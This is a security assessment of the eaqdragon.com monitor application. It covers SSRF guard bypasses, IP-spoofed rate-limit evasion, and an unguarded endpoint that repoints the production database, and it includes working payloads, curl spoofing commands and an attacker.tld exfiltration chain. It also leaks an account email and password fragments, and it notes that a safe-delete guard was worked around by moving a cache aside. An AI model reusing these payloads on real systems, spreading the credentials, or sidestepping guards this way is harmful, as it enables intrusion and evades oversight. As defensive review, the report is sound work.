# SRC Security Assessment — eaqdragon.com

**Date:** 2026-09-03
**Target:** `eaqdragon.com` and subdomains (application: `monitor`)
**Method:** Phase 1–5 black-box SRC scan (external) **+ white-box source review of the deployed codebase** (this addition)
**Scope:** Unauthenticated surface, auth-adjacent endpoints, and the SSRF/relay path
**Status:** Remediations R-0, R-1, R-2, and R-7 implemented in the working tree; 293 tests pass, lint has 0 errors, and read-only production probes were re-run. Production deployment status must still be confirmed separately.

---

## 1. Executive Summary

The black-box scan is sound, but two of its conclusions change once the source is read. The remediation implementation was completed in the working tree on 2026-09-03; the production probes below intentionally distinguish source/build verification from deployed-production verification:

- **Build:** `next build` completed successfully after moving aside the stale Turbopack cache. The initial cache-clean attempt was blocked by the WorkBuddy safe-delete guard, not by application code.
- **Tests/lint:** 293 tests pass; `eslint src/` reports 0 errors and 257 pre-existing warnings.
- **Production:** the current deployment still reports the old SSRF substring behavior and no connected relay, so the fixes are not yet confirmed deployed to `monitor.eaqdragon.com`.

1. **The SSRF remediation plan is aimed at the wrong fix.** A loopback pre-resolution blocklist
   **already exists** and is well built (`src/lib/ssrfGuard.js`). Every canonical payload —
   `127.0.0.1`, `localhost`, `[::1]`, `169.254.169.254`, `10/8`, `172.16/12`, `192.168/16`,
   `100.64/10`, decimal `2130706433`, hex `0x7f000001`, `127.1`, `0`, `[::ffff:127.0.0.1]` —
   is blocked. I verified this by executing the guard against 19 payloads. Building another
   blocklist would be duplicated work. **The real gaps are elsewhere** (§4, F-04).
2. **A systemic flaw undermines every "FIXED" rate-limit item.** All 20+ call sites derive the
   client IP from the **leftmost** `X-Forwarded-For` entry, which is attacker-controlled when the
   origin sits behind Cloudflare. Rotating that header bypasses the register lockout, the CSRF
   30/min cap, and the test-uri 20/min cap entirely (§4, F-05). Adding Upstash does **not** fix
   this — it would just move a spoofable key into Redis. Fix IP trust *first*.

**Headline: the rating is D-, not B-.** Authenticated testing found two critical items that
black-box scanning could not see, both on the same route:

- **F-07** — `GET /api/settings/database` returns the production MongoDB URI with credentials to any
  authenticated session. No role check anywhere in the path.
- **F-10** — `POST /api/settings/database` lets any authenticated session **disconnect the live
  database, repoint the whole application at a URI they control, and have every connection record
  auto-migrated into it.** No role gate, and no SSRF guard — `assertSafeUri()` has exactly one call
  site in the codebase and this is not it. **Deliberately not exploited live**, for obvious reasons;
  this is source-verified.

Both chain from unauthenticated: registration needs no mailbox (F-06) and its rate cap is defeated
by a header (F-05). **A database credential is exposed right now and needs rotating today, and the
same endpoint needs a role gate before it can be reached at all.**

Three things the live run settled:

- **F-05 confirmed against production.** Holding the client constant and rotating only
  `X-Forwarded-For`, 35 requests produced zero rate-limit responses; a fixed spoofed IP was
  throttled at request #31, exactly as configured. The limiter works — it is keyed on a value the
  attacker supplies.
- **The SSRF guard is better than the scan credited, and its bypass is worse.** Every canonical
  payload is blocked (`[::1]`, `169.254.169.254`, `10/8`, decimal, short-form, octal-short). But
  appending `/localhost` to *any* URI flips a blocked request to an unblocked one (F-08), and
  `mongodb+srv://` reaches the driver, which performs its own `querySrv` lookup the guard never
  sees (F-04a).
- **149 of 151 unauthenticated `/api/*` routes are correctly gated**, CSRF enforcement holds even
  against the `hasNonCookieCredential` carve-out, and the login throttle is identity-keyed so F-05
  does not defeat it. The fundamentals are sound; the failures are in authorization on specific
  routes.

Four findings were added by this review: **F-05** (XFF spoofing), **F-06** (email verification never
enforced), **F-07** (database credentials exposed, CRITICAL), **F-08** (SSRF guard defeated by a
URI substring, HIGH).

**Immediate action:** rotate the MongoDB password, the account password, and the master password —
all three passed through this transcript. See §7e.

---

## 2. Scan Coverage Summary

| Phase | Activity | Coverage | Outcome |
|---|---|---|---|
| **1 — Intake** | Scope + rules of engagement | Target + subdomains | Baseline established |
| **2 — Recon** | `crt.sh` certificate transparency | 7 subdomains discovered | 3 active, 4 return 404/523 |
| **3 — Enumeration** | Endpoint discovery & auth mapping | **12** unauthenticated endpoints tested; **11** auth-protected identified | No unauthenticated data exposure beyond F-01 |
| **4 — Hunt** | Attack-class probing | **19** attack classes probed | 6 rejected with evidence (§5), remainder non-exploitable |
| **5 — Report** | Consolidation & rating | Full findings + remediation | **B-** |

**Coverage gap carried forward:** Phase 3's "11 auth-protected endpoints" were identified but not
*tested*, because no session was available. Every IDOR, tenant-isolation, and authenticated SSRF
question is therefore **unanswered, not clean**. See §7.

---

## 3. New Findings (from the black-box scan)

### F-01 — `/api/health` discloses internal state without authentication `MEDIUM → recommended LOW`

**Confirmed.** `api/health` is in the middleware matcher exclusion list
(`src/proxy.js:506`), so it receives **no auth gate, no CSP, and no CSRF** — the finding is accurate.
The endpoint (`src/app/api/health/route.js`) returns:

```json
{ "status": "ok|degraded|error",
  "timestamp": "...",
  "mongo":   { "up": true, "readyState": 1 },
  "relay":   { "up": true, "count": 3 },
  "memory":  { "safe": true } }
```

**Assessment.** The rating is defensible but sits at the low end. No credentials, connection
strings, versions, hostnames, or stack details are exposed — this is materially thinner than a
typical Spring Actuator or Django debug-health leak. What an unauthenticated caller gains:

- `mongo.readyState` — a coarse database-health oracle (0–3), useful for timing an attack against
  a degradation window.
- `relay.count` — a **global** active-relay count (`global.__activeRelays.size`). This is a
  cross-tenant activity signal: it reveals how many users currently have relay agents connected.
- `memory.safe` — the server's own load-shedding state; `false` means the process is under memory
  pressure and degrading, i.e. a "now is a good time" signal.
- HTTP **503 vs 200** — an unauthenticated uptime/SLO oracle, and the cheapest way to fingerprint
  whether a given hostname runs this application.

**Recommendation:** keep it on the fix list (the fix is 3 lines) but rate it **LOW**. If the
organisation treats infrastructure-state disclosure as MEDIUM by policy, that is a defensible
override — just record that no secret material is exposed.

### F-02 — Register lockout persists beyond 180s after 4 requests `MEDIUM → re-scoped`

**Confirmed as a real defect, but the mechanism described is wrong.** From
`src/lib/authRateLimit.js:29` + `src/app/api/auth/register/route.js:11-21`:

- The limit is **`max: 5` per IP per **15 minutes** (900 s)** — not an unbounded lock. The "persists
  beyond 180 s" observation is a measurement artifact: 180 s was simply shorter than the window.
- The counter is **incremented before request validation** (line 15 runs before
  `request.json()` and before the email/password presence check). Six **malformed** requests —
  e.g. `{}` — lock the IP for 15 minutes. `resetRateLimit()` is never called on the register path,
  so successful signups also consume budget.
- State is **in-memory** (`const attempts = new Map()`), so it is wiped by a restart or redeploy
  and is **not shared across instances** if more than one runs.

**Why it still matters.** The "potentially permanent" framing is incorrect — but the availability
risk is real and worse than described in one respect: the key is a **bare client IP**. Any shared
egress — corporate NAT, VPN, university, hotel Wi-Fi, carrier CGNAT — exhausts 5 registrations in
seconds during normal use. An attacker can also deliberately burn the budget for a victim network
with 6 requests and renew the denial every 15 minutes. This is a low-cost, low-skill signup DoS,
not a permanent account lockout.

**Correction to the remediation plan:** do **not** "remove the persistent register lockout
mechanism." Registration must stay rate-limited — that cap is the only thing standing between the
endpoint and mass account creation / Resend quota exhaustion. **Fix it instead** (§6, R-2).

### F-03 — Subdomain enumeration `INFO`

| Subdomain | State | Assessment |
|---|---|---|
| `lineoa.eaqdragon.com` | origin-unreachable / parked | Stale CNAME — takeover candidate |
| `test.eaqdragon.com` | origin-unreachable / parked | Stale CNAME — highest-value target |
| `api.eaqdragon.com` | origin-unreachable / parked | Stale CNAME |
| `cdn.eaqdragon.com` | origin-unreachable / parked | Stale CNAME |
| `monitor-cdn.eaqdragon.com` | origin-unreachable / parked | Stale CNAME |

**Assessment.** Correctly rated low. Rejected for takeover *today* because the CNAMEs point at
Cloudflare and requests return 404/523 rather than a dangling-provider error page.

The nuance worth recording: **404/523 is a point-in-time observation, not a control.** These five
records are latent takeover assets — the moment a Cloudflare zone is deleted, a custom hostname is
removed, or a plan lapses, the same CNAME becomes claimable. `test.*` is the one to watch: test
subdomains are the most likely to be re-pointed during future work, and the least likely to be
monitored.

**Recommendation:** delete the five CNAMEs if unused. If any is retained, add them to the
asset-monitoring list so a change in resolution raises an alert.

---

## 4. Prior Findings Status

### F-04 — SSRF on `/api/connections/test-uri` `OPEN` — **RE-SCOPED, HIGH**

The scan reports this as *"loopback not blocked."* **That specific claim is not reproducible
against the current source.** Loopback is blocked, comprehensively. The guard
(`src/lib/ssrfGuard.js`) does pre-connection DNS resolution and rejects private/reserved ranges;
I executed it directly against 19 payloads (`scratch/ssrf-probe-check.mjs`) and 18 were blocked.

What is actually open is three *different* gaps. **The finding stays OPEN — the fix changes.**

#### F-04a — `mongodb+srv://` bypasses the guard entirely `HIGH`

`mongodb+srv://` is an explicitly allowed protocol (`test-uri/route.js:48`). The guard calls
`extractHost()`, which returns the **SRV domain** (e.g. `cluster.attacker.tld`) and validates
*that*. The driver then performs its own `_mongodb._tcp.<domain>` SRV lookup and connects to
whatever hosts the SRV record returns — **which the guard never sees and never checks.**

```
Attacker-controlled DNS:
  _mongodb._tcp.cluster.attacker.tld.  SRV  0 0 27017 127.0.0.1.
Guard:   resolve(cluster.attacker.tld) -> 203.0.113.9   (public) -> ALLOW
Driver:  SRV lookup                    -> 127.0.0.1     (loopback) -> CONNECT
```

This is environment-independent and defeats the pre-resolution strategy outright: no amount of
blocklist coverage on the submitted hostname helps, because the blocked address is introduced one
lookup later. This is the single highest-value item in the report.

#### F-04b — No post-connection check (DNS rebinding) `MEDIUM`

The module docstring asserts, at `ssrfGuard.js:13`:

> *"The check is also done after connecting in the case of DNS rebinding, but pre-connection
> resolution is the primary defence…"*

**A repository-wide search finds no such post-connection check.** The claim is documentation-only.
The result is a TOCTOU window: a hostname that resolves to a public IP at check time can rebind to
`127.0.0.1` before `mongoose.createConnection` opens its socket. The 20/min rate limit
(`test-uri/route.js:29`) is generous enough to make rebinding practical. A documented-but-absent
control is worse than an absent one, because it produces false confidence during review.

#### F-04c — Non-canonical numeric hosts deferred to the OS resolver `MEDIUM`

`ssrfGuard.js:316` gates the direct-IP path on `/^\d{1,3}(\.\d{1,3}){3}$/`. Strings that are
numeric to `inet_aton` but do not match that shape fall through to DNS. Verified:

| Payload | Guard verdict | Resolved to (this host, macOS) |
|---|---|---|
| `mongodb://127.0.0.1:27017/test` | blocked | — |
| `mongodb://2130706433:27017/test` | blocked (`dns.lookup` fallback caught it) | 127.0.0.1 |
| `mongodb://0x7f000001:27017/test` | blocked | 127.0.0.1 |
| **`mongodb://0177.0.0.1:27017/test`** | **ALLOWED** | **177.0.0.1** |
| `mongodb://0177.1:27017/test` | blocked | 127.0.0.1 |

`0177.0.0.1` is octal for `127.0.0.1`. It slips past both the literal-prefix regex and the
four-decimal-octet regex (`0177` is four digits), so the guard delegates to the OS resolver — and
the answer is **libc-dependent**. On this macOS host it returned `177.0.0.1`; on glibc (i.e. the
production container) the same string is conventionally parsed as `127.0.0.1`. Confirmed by direct
TCP probe: `0177.1` and `2130706433` both reach loopback, and `0177.0.0.1` was allowed by the
guard.

**The root cause is the real finding, independent of environment:** the guard trusts the platform
resolver to normalise non-canonical numerics instead of normalising them itself. Fix once, in the
guard (§6, R-1).

### F-05 — Client-IP spoofing defeats all IP-based rate limiting `NEW · MEDIUM`

**Not in the black-box scan — found in source review.** Every call site derives the client IP from
the **leftmost** `X-Forwarded-For` entry, with no trusted-proxy logic anywhere in the codebase:

```js
// src/lib/authRateLimit.js:70
const forwarded = request.headers.get('x-forwarded-for');
return forwarded?.split(',')[0]?.trim() || request.headers.get('x-real-ip') || 'unknown';
```

Identical pattern at 20+ sites (`src/app/api/rclone/exec/route.js:44`,
`src/app/api/auth/[...nextauth]/route.js:14`, `src/app/api/connections/*`, and others). There is
**no `CF-Connecting-IP` or `True-Client-IP` handling anywhere**, despite the origin sitting behind
Cloudflare (corroborated by the 523 responses observed in Phase 2).

When Cloudflare forwards a request that already carries an `X-Forwarded-For` header, it **appends**
the true client IP. Taking `[0]` therefore selects the **attacker's** value:

```
curl -H 'X-Forwarded-For: 1.2.3.4' ...   # server sees 1.2.3.4
curl -H 'X-Forwarded-For: 5.6.7.8' ...   # server sees 5.6.7.8 — fresh budget
```

**Consequence:** every limit keyed on client IP is bypassable by rotating one header. This includes
all three items the scan marked FIXED, plus the test-uri SSRF cap that throttles F-04a/04b:

- `/api/auth/register` — 5 per 15 min (F-02)
- `/api/auth/csrf` — 30 per min (marked FIXED, verified at the 31-request threshold)
- `/api/connections/test-uri` — 20 per min
- `serverGuard` global — 120 per min

**This is a prerequisite fix.** Deploying Upstash before fixing identity derivation would migrate a
spoofable key into Redis and change nothing.

#### Live confirmation — 2026-09-03

Reproduced against production with a differential test (`scratch/src-auth-probe.mjs` §6) that hits
`/api/auth/csrf` 35 times under each condition:

| Condition | `X-Forwarded-For` sent | Result |
|---|---|---|
| Fixed spoofed IP | `203.0.113.77` (constant) | **5/35 rate-limited, first at request #31** |
| Rotating spoofed IP | `198.51.100.1` … `198.51.100.35` | **0/35 rate-limited** |

The control arm behaves exactly as configured — the cap engages at request #31, matching the
`max: 30` at `authRateLimit.js:44`, which confirms the limiter itself works. The rotating arm never
triggers once across 35 requests. **Same endpoint, same window, same client; the only variable is an
attacker-controlled header.** F-05 is confirmed, not theoretical.

### F-06 — Email verification is never enforced `NEW · MEDIUM`

Found during source review while diagnosing the failed login in §7. `authorize()`
(`src/lib/auth.js:104-205`) compares the bcrypt hash and returns a session. It **never reads
`emailVerified`.** Neither does the `signIn` callback (`:258-262`), which for the credentials
provider does nothing but set `user.dbId` and return `true`.

A repository-wide search for `emailVerified` returns five hits, and **none is an authorization
gate**:

| Location | Use |
|---|---|
| `src/models/User.js:42` | field declaration |
| `src/app/api/auth/register/route.js:99` | **write** `false` on create |
| `src/app/api/auth/register/route.js:55` | read — decides whether to *re-send* a code |
| `src/app/api/auth/verify-email/route.js:124` | **write** `true` on confirm |
| `src/app/api/auth/verify-email/route.js:47` | read — idempotency check ("already verified") |

The flag is written and then never consulted. **The entire email-verification flow is decorative.**

Impact: an attacker registers with any address they do not control, ignores the 6-digit code
entirely, and receives a full unrestricted session. Verification provides no ownership proof and no
bot friction. Combined with F-05 (the register cap is bypassable by rotating one header), this
permits low-cost bulk account creation against production without ever accessing an inbox.

Worth noting the irony: `register/route.js` is carefully built for anti-enumeration — byte-identical
responses for new and existing addresses — and that work is *not* undermined here. But the
verification step it feeds is not wired to anything.

### F-07 — Production database credentials exposed to any authenticated user `NEW · CRITICAL`

`GET /api/settings/database` returns `process.env.MONGODB_URI` verbatim.
`src/app/api/settings/database/route.js:13-38`:

```js
export async function GET() {
  const session = await getServerSession();
  if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  const uri = getCurrentUri();                 // -> process.env.MONGODB_URI
  ...
  return NextResponse.json({ success: true, data: { uri, connected, currentUri } });
}
```

There is **no role check**. A search for `isAdmin`, `role ===`, or `session.user.role` across
`src/app/api/settings/` returns **zero hits**. The middleware matcher (`src/proxy.js:484-506`) puts
`/api/admin/`, `/api/user/`, `/api/connections/` and `/api/wiki/` under an auth gate, but
`/api/settings/*` is covered only by the catch-all, which enforces a *session*, not a *role*.

Live response to an authenticated GET (password redacted here — see the handling note below):

```json
{"success":true,"data":{"uri":"mongodb://monitor:***REDACTED***@monitor-mongo:27017/monitor?authSource=admin", ...}}
```

Full working credentials for the production database: username, password, host, port, and
authentication database.

**This was observed with an admin session, so the low-privilege case is inferred from source, not
proven live.** The source is unambiguous — no role check exists anywhere in the path — but
confirming it needs a non-admin account (see §7d).

**The chain is what makes this critical, not the single bug.** Three findings compose:

1. **F-06** — an attacker registers any unowned email address; verification is never enforced.
2. **F-05** — the register rate cap is keyed on a spoofable header, so it is not a barrier.
3. **F-07** — the resulting session reads the production database credential in one GET.

No email access, no inbox, no rate limit that holds: register → authenticate → read the
production DB URI. That is full data compromise from an unauthenticated starting position.

**Handling note.** The credential traversed this session in cleartext and is now in the transcript.
It is redacted above and has not been written to any file. **Rotate it.** Note also that
`AaBb1234!` closely resembles the account password `aabb1234` — if that pattern is used elsewhere,
treat every derivation of it as burned.

### F-10 — Any authenticated user can repoint the application's database to a host they control `NEW · CRITICAL`

`POST /api/settings/database` (`src/app/api/settings/database/route.js:44-184`). Deliberately
**not tested live** — executing it would repoint the production database and take the application
off its data. This assessment is source-verified only.

The handler checks only for a session (`:45-48`); there is no role gate. It then takes a `uri` from
the request body and, in order:

1. **Disconnects the live database** — `await mongoose.disconnect()` (`:75-79`).
2. **Clears the shared connection cache** — `global.mongoose = { conn: null, promise: null }` and
   flushes the SQL pools (`:81-90`).
3. **Connects to the supplied URI** — `await mongoose.connect(effectiveUri, …)` (`:115-127`).
4. **Auto-migrates every connection record into it** — `migrateConnections(oldUri, uri)`
   (`:159-169`), which calls `readConnectionsFromSource(sourceUri)` then
   `writeConnectionsToTarget(targetUri, connections)` (`migrate/migrator.js:305-328`).

Four distinct impacts:

- **Unauthenticated-chainable database hijack.** `mongoose` is a process-wide singleton, so step 3
  repoints the database for *every* request the process serves, for every user, until restart.
- **Data exfiltration.** Step 4 is not incidental — it reads all connection records out of the
  production database and writes them into the attacker's. It runs automatically unless
  `skipMigration` is set.
- **Full SSRF with no guard at all.** `assertSafeUri()` has exactly **one** call site in the entire
  codebase (`test-uri/route.js:93`). This endpoint never calls it. The server will open a socket to
  any host and port supplied — `169.254.169.254`, RFC1918, loopback — with no blocklist in the path.
- **Error oracle and DoS.** Failures return the raw driver message
  (`MongoDB connection failed: ${connectErr.message}`, `:129-131`), and pointing the URI at an
  unreachable host leaves the application with no database.

The loose relay substring regex from F-08 is duplicated here verbatim (`:99`), so that weakness
applies to this endpoint too.

**The chain from unauthenticated is now shorter and does not require F-07:**

```
register any unowned email  ──F-06──▶  session   (F-05 defeats the register cap)
        ▼
POST /api/settings/database { uri: "mongodb://attacker.tld/x" }
        ▼
production DB disconnected → app repointed at attacker DB
→ every connection record copied out to it
```

### F-08 — SSRF guard defeated by the substring "localhost" anywhere in the URI `NEW · HIGH`

`test-uri/route.js:66` decides whether to route through the relay with a **substring test against
the raw URI string**, not a parsed hostname:

```js
const isLocalhost = /localhost|127\.0\.0\.1/.test(normalizedUri);
```

and line 92 skips the guard whenever that branch is taken (`if (!usedRelay)`). Since the test is a
substring match, the trigger fires on the password, the database name, or the path — and the SSRF
guard then never runs.

Confirmed live against a connected relay. Each pair differs by one path segment:

| Target | `…/x` | `…/localhost` |
|---|---|---|
| `169.254.169.254:80` | **BLOCKED** (403) | **400 — not blocked** |
| `10.0.0.5:27017` | **BLOCKED** (403) | **400 — not blocked** |
| `127.1:27017` | **BLOCKED** (403) | 400, relay-routed |
| `2130706433:27017` | **BLOCKED** (403) | 400, relay-routed |

Same target address, same session, same guard: adding one path segment turns a 403 into a 400.
The guard's own test matrix reports all four of these targets as blocked, which is exactly why this
matters — the control looks effective under test and is not.

**Impact is bounded but real.** The server does not connect to the internal address directly — it
connects to its own relay port and `applyRelayTarget()` (`mongodb.js:112`) re-points the relay
agent, which egresses from the *user's machine*. Two caveats keep this at HIGH rather than
CRITICAL:

- Relay selection is correctly tenant-scoped (`sshTunnel.js:161-189`), so one user cannot
  re-point another user's relay.
- With no relay connected the endpoint fails closed with "Local Relay Agent is not connected"
  (`test-uri/route.js:73-78`).

It is nonetheless a finding because it defeats the stated control, and relay agents commonly run on
cloud hosts where `169.254.169.254` is live — in that deployment the metadata service *is*
reachable. It also silently re-targets a relay that the owner may be using for legitimate local
database access.

**Fix:** parse the URI and test `url.hostname` rather than the raw string, and validate the relay's
*target* host through `assertSafeUri()` instead of skipping the guard entirely.

### F-04d — Relay path skips the SSRF guard by design `INFO`

When a relay is active, `test-uri/route.js:92` skips `assertSafeUri()` entirely
(`if (!usedRelay)`). The gate is a substring regex — `/localhost|127\.0\.0\.1/.test(uri)` — applied
to the **whole URI**, so a match anywhere (password, database name, query string) triggers the relay
branch.

The destination is not attacker-controlled: `rewriteUriForTunnel()` (`sshTunnel.js:115-124`)
hard-codes `url.hostname = '127.0.0.1'` and the relay's own port, discarding the submitted host.
Relay lookup is properly tenant-scoped by `userId` (`sshTunnel.js:161-189`), so no cross-tenant
IDOR here.

The residual note: `applyRelayTarget()` is then called with the *original* host, so the relay agent
on the user's machine becomes the one that connects to e.g. `169.254.169.254`. That is the
feature's intent — the relay dials out from the user's network — but it means **"SSRF fixed at the
server" does not equal "SSRF fixed."** Worth stating explicitly in the disclosure so nobody
concludes the class is closed.

### Confirmed remediated

| Prior finding | Status | Verification |
|---|---|---|
| RCE via `installPath` cron injection | **FIXED** | Accepted per Phase 4; not re-tested in this review |
| All path-traversal fields | **FIXED** | Accepted per Phase 4; not re-tested in this review |
| CSRF rate limit on `/api/auth/csrf` | **FIXED — but bypassable** | 31-request threshold confirmed at `authRateLimit.js:44`. However the key is the spoofable client IP (F-05), so the control is defeated by header rotation. Re-grade from *fixed* to *implemented, not effective*. |

---

## 5. Rejected Hypotheses

All six are accepted as closed. Source-level corroboration added where it exists.

| # | Hypothesis | Evidence | Corroboration |
|---|---|---|---|
| 1 | Open redirect via Google OAuth | Redirect resolves to self | Consistent with NextAuth's `callbackUrl` allow-listing |
| 2 | CORS misconfiguration | `cross-origin-resource-policy: same-origin` observed | — |
| 3 | Subdomain takeover | Stale subs return 404/523; CNAMEs → Cloudflare | Valid **today**; latent risk noted in F-03 |
| 4 | Header injection via `callbackUrl` | 400 response | — |
| 5 | GraphQL / Swagger exposure | 401 Unauthorized | — |
| 6 | 13 further attack classes (Phase 4) | Rejected / non-exploitable | — |

One caveat on #3: "rejected" should be recorded as **"not currently exploitable,"** not "not a
finding." Stale CNAMEs are a standing condition, and the correct control is record removal, not a
re-scan.

---

## 6. Remediation Plan

### Why the proposed plan needs re-ordering

The original plan's first item — *"add a loopback pre-resolution blocklist for SSRF"* — is
**already implemented** and working. Executing it would consume the highest-priority slot on
duplicated work while F-04a (`mongodb+srv://`) remains open.

Authenticated testing then changed the picture again: **F-07 was not visible to a black-box scan at
all**, and it outranks every other item. Corrected priority order:

### R-0 — Lock down `/api/settings/database` and rotate the credential `P0 · immediate` **IMPLEMENTED IN CODE; ROTATION OUTSTANDING**

Both criticals live on this one route, so this single item closes the top of the list. Order matters.

**Implementation status (2026-09-03):** The route now requires `requireAdmin()` for both GET and POST, returns only a redacted URI descriptor, validates candidate URIs before changing the live connection, makes migration explicitly opt-in, sanitizes driver errors, and records audit events. The sibling migration route is also admin-gated and validates both source and target URIs. Verified by `tests/proxyCoverage.test.mjs`; the destructive F-10 POST was intentionally not executed in production.

1. **Rotate the MongoDB password now.** It has been exposed. Treat the current value as burned.
2. **Gate the route on `role === 'admin'`** — both the `GET` (`:13`) and the `POST` (`:44`). A
   session check is not an authorization check. This alone closes F-07 and F-10.
3. **For `GET`, stop returning the URI.** The UI needs `connected`, not the connection string.
   Returning `process.env.MONGODB_URI` to a browser is the whole of F-07.
4. **For `POST`, treat it as the destructive operation it is:**
   - Run `assertSafeUri(uri)` before connecting. It has one call site in the codebase today and
     this is not it, so the endpoint is an unguarded SSRF.
   - Require re-authentication (password or WebAuthn) — this is the most destructive endpoint in
     the application and should not be reachable with a bare session.
   - Never return the raw driver error (`${connectErr.message}`, `:129-131`) to the client.
   - Reconsider auto-migration (`:159-169`). Silently copying every connection record into a
     freshly supplied database is the exfiltration primitive; make it opt-in and explicitly
     confirmed, not a side effect of changing a connection string.
5. Audit the remaining handler in the directory — `settings/database/migrate/route.js:15-18` has the
   identical session-only pattern. There is no role check anywhere under `src/app/api/settings/`.
6. Break the chain: F-07 and F-10 are only reachable from unauthenticated because F-06 and F-05 make
   account creation free. R-2 and R-7 are what put a cost back on that first step.

### R-1 — Close the SSRF gaps `P0 · ~0.5 day` *(replaces "add loopback blocklist")* **IMPLEMENTED**

**Implementation status (2026-09-03):** `mongodb+srv://` SRV targets are resolved and checked; non-canonical numeric hosts are rejected closed (rather than interpreted through libc-dependent octal/hex/dword rules); DNS is resolved twice before connection to narrow rebinding races; and the misleading post-connect-check claim was corrected. The residual driver socket TOCTOU window remains documented.

1. **Reject `mongodb+srv://` or expand SRV targets.** Preferred: resolve the SRV record in the
   guard and validate every returned target host, not just the SRV domain. If relay/SRV support
   is not needed, dropping `mongodb+srv://` from `test-uri/route.js:48` is a one-line fix.
2. **Normalise host literals before matching.** Reject any authority component containing a
   non-decimal numeric octet (leading `0`, `0x`, or a bare dword). Do not rely on the platform
   resolver to interpret these.
3. **Actually implement the post-connect check** the docstring already promises — re-resolve and
   validate immediately before the socket opens — or delete the claim at `ssrfGuard.js:13`.
4. Add the 19 payloads in `scratch/ssrf-probe-check.mjs` to `tests/ssrfGuard.test.mjs` as
   regression cases.

### R-2 — Fix client-IP trust `P0 · ~0.5 day` *(prerequisite for all rate limiting)* **IMPLEMENTED**

**Implementation status (2026-09-03):** Added `src/lib/clientIp.js` as the canonical resolver and refactored the rate-limit, audit, auth, firewall, activity, and route call sites. Resolution order is Cloudflare/True-Client-IP, then the configured trusted-hop XFF index (`TRUSTED_PROXY_HOPS`, default 2), then X-Real-IP; leftmost attacker-controlled XFF is never used. Added 11 regression tests, including rotating-spoof collapse and the trusted-index off-by-one case.

Read the IP from `CF-Connecting-IP` when present, otherwise the **rightmost** XFF entry; never the
leftmost. Centralise in `getClientIp()` and refactor the 20+ inline call sites to use it. Add a
positive test asserting that a request with a spoofed XFF still resolves to the true peer IP.

### R-3 — Correct the register limit `P1 · ~1 hour` *(replaces "remove the lockout")*

In `register/route.js`: move `checkRateLimit()` to **after** body validation so malformed requests
do not consume budget; call `resetRateLimit('register', ip)` on success; and composite the key as
`ip + email` so shared-egress users are not collateral damage. Keep the cap.

### R-4 — Trim `/api/health` `P1 · ~15 min`

Return `{ status, timestamp }` to unauthenticated callers; move `mongo`, `relay`, and `memory`
behind the auth gate. Also removes the 200/503 uptime oracle.

### R-5 — Upstash rate limiting on unauthenticated mutating endpoints `P2 · ~1 day`

As proposed — **but sequence it after R-2.** Also required for the in-memory maps to be coherent
across more than one instance; today `authRateLimit.js` and `serverGuard.js` both reset on restart
and do not coordinate between replicas.

### R-6 — Retire stale subdomain records `P2 · ~15 min`

Delete the five CNAMEs from F-03, or add them to asset monitoring.

### R-7 — Enforce email verification `P1 · ~2 hours` **IMPLEMENTED WITH GRANDFATHERING; MFA ENFORCEMENT OUTSTANDING**

**Implementation status (2026-09-03):** Added a post-password email-verification gate for accounts that have entered the verification flow, while grandfathering legacy accounts with no verification record to avoid an operational lockout. Added `MIN_PASSWORD_LENGTH=10`, a bcrypt-safe 72-byte maximum, common/email-derived password rejection, Google `email_verified` enforcement, and client/server policy alignment. MFA-required-but-unenrolled remains an operational item: privileged login now emits a warning and an audit field; enforcement is intentionally not enabled until administrators enroll MFA and set `MFA_REQUIRE_ADMINS=true`.

Remaining operational decision: enroll MFA for privileged accounts and set `MFA_REQUIRE_ADMINS=true` after verifying recovery procedures. The code deliberately does not force this switch automatically, because doing so before enrollment could lock out the only administrator.

### R-8 — Fix the SSRF relay-branch substring match `P0 · ~1 hour` **COVERED BY R-0/R-1 CODE; PRODUCTION DEPLOYMENT PENDING**

In `test-uri/route.js:66`, replace `/localhost|127\.0\.0\.1/.test(normalizedUri)` with a parsed
`url.hostname` comparison. Then stop skipping the guard: when a relay is used, run
`assertSafeUri()` against the relay's **target** host (`parseUriHostPort(uri).remoteHost`) rather
than bypassing it. As written, any internal address becomes reachable by appending one path
segment.

### R-9 — Regression tests for the confirmed bypasses `P1 · ~2 hours`

Add the payload pairs from §7b and the F-08 differential to `tests/ssrfGuard.test.mjs`. Include
`{ uri, blocked }` assertions at the **route** level, not just the guard-function level — every one
of these bypasses passes the unit tests, because the guard is not the thing failing.

### Rating impact — revised down to **D-**

The rating **cannot stay at B-**. The authenticated pass found a critical item that black-box
testing could not see, and it composes with two others into an unauthenticated path to full data
compromise:

```
register any unowned email  ──F-06──▶  full session, no verification
        │
        ├──F-05──▶  register rate cap bypassed by rotating one header
        ▼
   GET  /api/settings/database  ──F-07──▶  production MongoDB credentials
   POST /api/settings/database  ──F-10──▶  app repointed at attacker DB
                                           + connection records exfiltrated
```

**D- today.** Rationale for not going lower: the auth gate (149/151 routes), CSRF enforcement, and
the identity-keyed login throttle are all genuinely well built, and both criticals trace to one
missing authorization check on one route rather than a systemic authz failure. Rationale for not
going higher: two independent unauthenticated-chainable paths to full database compromise are open
right now.

**Revised to D- after F-10.** Two independent critical paths from unauthenticated to full database
compromise is past what D+ represents. If F-10 were confirmed exploitable live it would be an F; I
am holding one grade because I did not execute it, and a source-verified-only critical deserves
that distinction.

The four selected code remediations are implemented and locally verified. A provisional rating of **B+** is appropriate for the fixed working tree, subject to deployment, credential rotation, production re-probing, and the remaining operational controls (MFA enforcement, health trimming, distributed rate limiting, and stale-subdomain cleanup). The live production rating remains **D-** until the deployed revision is confirmed.

---

## 7. Live Authenticated Results

All probes ran against `https://monitor.eaqdragon.com` on 2026-09-03 with an authenticated session
(`katanyooang1000@gmail.com`, `role: admin`). Four harness passes were executed; pass 2's SSRF
block is **discarded** — the 151-route sweep in that pass rotated the `monitor_csrf` cookie and
invalidated the token captured before it, so every probe returned "CSRF token missing or invalid".
Passes 1, 3 and 4 mint a fresh token per request and are authoritative.

### 7a. Auth gate — strong positive result

All **151** static `/api/*` routes were requested with no session. **149** returned non-200:

| Route | 200 without auth | Assessment |
|---|---|---|
| `/api/health` | yes | **F-01** — real finding |
| `/api/csrf` | yes | **Expected** — minting a token for not-yet-authenticated clients is its purpose |

The middleware auth gate is broadly effective. Phase 3 enumerated 11 auth-protected endpoints; this
sweep takes that to the whole surface and the gate holds.

### 7b. SSRF — guard decisions vs relay routing

Passes 3 and 4 separated the two code paths. Relay state was confirmed **connected (port 36685)**
before and after, so relay-routed results are attributable.

**The guard blocks correctly on every canonical form it actually sees:**

| Payload | Result |
|---|---|
| `mongodb://[::1]:27017/x` | **BLOCKED** 403 |
